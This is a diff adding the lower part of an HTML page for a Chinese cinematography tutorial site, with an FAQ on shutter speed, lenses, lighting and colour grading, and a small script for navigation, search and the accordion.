+      <div class="head-l"><div class="bar"></div><h2>数据<em>解析</em></h2></div>
+      <span class="head-s">// SHOOTING STATS</span>
+    </div>
+    <div class="rings">
+      <div class="ring"><div class="svg"><svg viewBox="0 0 120 120"><circle class="bg"/><circle class="fg" style="stroke-dashoffset:45"/></svg><div class="pct">85%</div></div><h4>成片率</h4><p>拍前规划到位，有效素材占比显著提升</p></div>
+      <div class="ring"><div class="svg"><svg viewBox="0 0 120 120"><circle class="bg"/><circle class="fg" style="stroke-dashoffset:60"/></svg><div class="pct">80%</div></div><h4>动态范围利用</h4><p>合理曝光保留高光与暗部细节</p></div>
+      <div class="ring"><div class="svg"><svg viewBox="0 0 120 120"><circle class="bg"/><circle class="fg" style="stroke-dashoffset:30"/></svg><div class="pct">90%</div></div><h4>读者满意度</h4><p>教程实战性强，读者反馈好评率</p></div>
+      <div class="ring"><div class="svg"><svg viewBox="0 0 120 120"><circle class="bg"/><circle class="fg" style="stroke-dashoffset:75"/></svg><div class="pct">75%</div></div><h4>器材复用率</h4><p>理性选择长期使用的核心装备</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目6：常见问题 手风琴 -->
+<section id="qa" style="background:var(--bg2)">
+  <div class="container">
+    <div class="head">
+      <div class="head-l"><div class="bar"></div><h2>常见<em>问题</em></h2></div>
+      <span class="head-s">// FAQ</span>
+    </div>
+    <div class="faq" id="faq">
+      <div class="faq-i open">
+        <button class="faq-q">手机能不能拍出电影感？<span class="ic">+</span></button>
+        <div class="faq-a"><div>完全可以。手机拍电影感的关键在于光线、构图、运镜与后期调色的配合。控制曝光不要过曝、多用自然光或简单补光、固定机位或用稳定器运镜，再配合 24fps 帧率与 180° 快门，画面质感会立刻提升。</div></div>
+      </div>
+      <div class="faq-i">
+        <button class="faq-q">新手第一支镜头该怎么选？<span class="ic">+</span></button>
+        <div class="faq-a"><div>建议从 35mm 或 50mm 大光圈定焦开始。定焦镜头光圈大、画质好、价格相对亲民，能迫使你用脚步去构图，更快培养镜头感。预算允许可再补一支 85mm 用于人像特写。</div></div>
+      </div>
+      <div class="faq-i">
+        <button class="faq-q">拍视频时快门速度怎么定？<span class="ic">+</span></button>
+        <div class="faq-a"><div>遵循 180° 快门法则：快门速度约为帧率倒数的两倍。拍 25fps 用 1/50s，拍 50fps 用 1/100s。这样能保留自然的动态模糊，运动画面看起来更电影、更舒服。</div></div>
+      </div>
+      <div class="faq-i">
+        <button class="faq-q">室内暗光环境怎么布光？<span class="ic">+</span></button>
+        <div class="faq-a"><div>优先用一盏主光打在主体上，再用反光板或柔光布补暗部，最后加一盏轮廓光从背后分离主体与背景。小成本方案可用 LED 面板加柔光箱，控制光比在 2:1 左右最自然。</div></div>
+      </div>
+      <div class="faq-i">
+        <button class="faq-q">调色一定要用 LUT 吗？<span class="ic">+</span></button>
+        <div class="faq-a"><div>不是必须的。LUT 只是快速定调的工具，真正重要的是先做好一级校色（还原曝光与白平衡），再针对肤色等区域做二级精修。掌握手动调色逻辑后，LUT 只是锦上添花。</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="container">
+    <div class="f-grid">
+      <div class="f-brand">
+        <div class="brand"><i>🎞</i>影视<em>摄影</em></div>
+        <p>影视摄影（yingshisheying-wap.github.io）专注影视级摄影技巧与实战教学，分享运镜、灯光、器材与调色干货，帮助摄影爱好者拍出电影感画面。</p>
+      </div>
+      <div class="f-col"><h4>学习内容</h4><ul><li><a href="#course">实战教程</a></li><li><a href="#gear">器材评测</a></li><li><a href="#gallery">样片画廊</a></li><li><a href="#data">数据解析</a></li></ul></div>
+      <div class="f-col"><h4>热门分类</h4><ul><li><a href="#">运镜技巧</a></li><li><a href="#">布光教程</a></li><li><a href="#">后期调色</a></li><li><a href="#">短片创作</a></li></ul></div>
+      <div class="f-col"><h4>关于我们</h4><ul><li><a href="#qa">常见问题</a></li><li><a href="#">投稿合作</a></li><li><a href="#">免责声明</a></li><li><a href="#">联系主理人</a></li></ul></div>
+    </div>
+    <div class="f-bot">
+      <p>© 2026 影视摄影 yingshisheying-wap.github.io · 让每一帧都有电影感</p>
+      <p><a href="#top">回到顶部 ↑</a></p>
+    </div>
+  </div>
+</footer>
+
+<div class="smask" id="sMask" role="dialog" aria-modal="true" aria-label="站内搜索">
+  <button class="sclose" id="sClose" aria-label="关闭搜索">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M18 6L6 18M6 6l12 12"></path></svg>
+  </button>
+  <div class="sbox">
+    <input type="search" id="sInput" placeholder="搜索教程、器材、技巧..." autocomplete="off">
+    <div class="shots"><span>&gt; HOT</span><a href="#">运镜</a><a href="#">布光</a><a href="#">调色</a><a href="#">35mm</a><a href="#">夜景</a></div>
+  </div>
+</div>
+
+<button class="top" id="topBtn" aria-label="回到顶部">
+  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M18 15l-6-6-6 6"></path></svg>
+</button>
+
+<script>
+(function(){
+  'use strict';
+  var nav=document.getElementById('navbar'),menu=document.getElementById('menu');
+  var links=document.querySelectorAll('.menu a'),sections=document.querySelectorAll('section[id]');
+  var topBtn=document.getElementById('topBtn');
+  function onScroll(){
+    var y=window.scrollY;
+    nav.classList.toggle('solid',y>30);
+    topBtn.classList.toggle('show',y>500);
+    var cur='';
+    sections.forEach(function(s){ if(y>=s.offsetTop-130) cur=s.id; });
+    links.forEach(function(a){ a.classList.toggle('on',a.getAttribute('href')==='#'+cur); });
+  }
+  window.addEventListener('scroll',onScroll,{passive:true}); onScroll();
+
+  document.getElementById('burger').addEventListener('click',function(){ menu.classList.toggle('open'); });
+  links.forEach(function(a){ a.addEventListener('click',function(){ menu.classList.remove('open'); }); });
+  topBtn.addEventListener('click',function(){ window.scrollTo({top:0,behavior:'smooth'}); });
+
+  var mask=document.getElementById('sMask'),sinput=document.getElementById('sInput');
+  document.getElementById('sOpen').addEventListener('click',function(){ mask.classList.add('show'); setTimeout(function(){sinput.focus();},100); });
+  document.getElementById('sClose').addEventListener('click',function(){ mask.classList.remove('show'); });
+  mask.addEventListener('click',function(e){ if(e.target===mask) mask.classList.remove('show'); });
+  document.addEventListener('keydown',function(e){
+    if(e.key==='Escape') mask.classList.remove('show');
+    if((e.ctrlKey||e.metaKey)&&e.key==='k'){ e.preventDefault(); mask.classList.add('show'); setTimeout(function(){sinput.focus();},100); }
+  });
+
+  document.querySelectorAll('.faq-i').forEach(function(it){
+    var ans=it.querySelector('.faq-a'),q=it.querySelector('.faq-q');
+    if(it.classList.contains('open')) ans.style.maxHeight=ans.scrollHeight+24+'px';
+    q.addEventListener('click',function(){
+      var open=it.classList.contains('open');
+      document.querySelectorAll('.faq-i').forEach(function(x){
+        x.classList.remove('open'); x.querySelector('.faq-a').style.maxHeight=null;
+      });
+      if(!open){ it.classList.add('open'); ans.style.maxHeight=ans.scrollHeight+24+'px'; }
+    });
+  });
+})();
+</script>
+</body>
+</html>
